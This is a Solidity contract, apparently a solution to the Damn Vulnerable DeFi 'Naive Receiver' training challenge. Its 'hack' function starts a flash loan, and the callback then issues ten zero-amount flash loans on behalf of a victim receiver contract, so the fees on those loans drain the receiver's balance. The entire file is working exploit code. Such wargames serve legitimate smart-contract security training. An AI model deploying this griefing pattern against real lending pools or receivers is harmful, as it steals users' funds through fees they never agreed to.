// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

/**
 * @title FlashLoanReceiver
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract NaiveReceiverHack is IERC3156FlashBorrower {
  address public constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
  address public pool;
  address public receiver;

  constructor(address _pool, address _receiver) {
    pool = _pool;
    receiver = _receiver;
  }

  function hack() external {
    IERC3156FlashLender(pool).flashLoan(
      IERC3156FlashBorrower(this),
      ETH,
      0 ether,
      ''
    );
  }

  function onFlashLoan(
      address,
      address,
      uint256,
      uint256,
      bytes calldata
  ) external returns (bytes32) {
    for (uint i = 0; i < 10; i++) {
      IERC3156FlashLender(pool).flashLoan(
        IERC3156FlashBorrower(receiver),
        ETH,
        0 ether,
        ''
      );
    }
    return keccak256("ERC3156FlashBorrower.onFlashLoan");
  }

  receive() external payable {}
}
